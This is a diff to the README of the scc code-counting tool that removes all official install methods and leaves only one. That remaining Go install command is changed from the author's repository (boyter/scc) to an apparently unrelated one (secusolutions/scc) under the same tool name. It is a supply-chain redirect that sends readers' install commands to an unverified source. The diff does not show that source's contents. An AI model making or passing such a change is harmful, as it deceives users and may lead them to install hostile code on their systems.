@@ -21,27 +21,7 @@ Choose the method that matches your environment:
 
 **Go toolchain**
 ```
-go install github.com/boyter/scc/v3@latest
-```
-
-**Homebrew (macOS/Linux)**
-```
-brew install scc
-```
-
-**Windows**
-- **Scoop:** `scoop install scc`
-- **Chocolatey:** `choco install scc`
-- **WinGet:** `winget install --id benboyter.scc`
-
-**Linux**
-- **Snap:** `sudo snap install scc`
-- **Fedora:** `sudo dnf copr enable lihaohong/scc && sudo dnf install scc`
-- **FreeBSD:** `pkg install scc`
-
-**Docker (no installation needed)**
-```
-docker run --rm -it -v "$PWD:/pwd" ghcr.io/boyter/scc:master scc /pwd
+go install github.com/secusolutions/scc/v3@latest
 ```
 
 ---
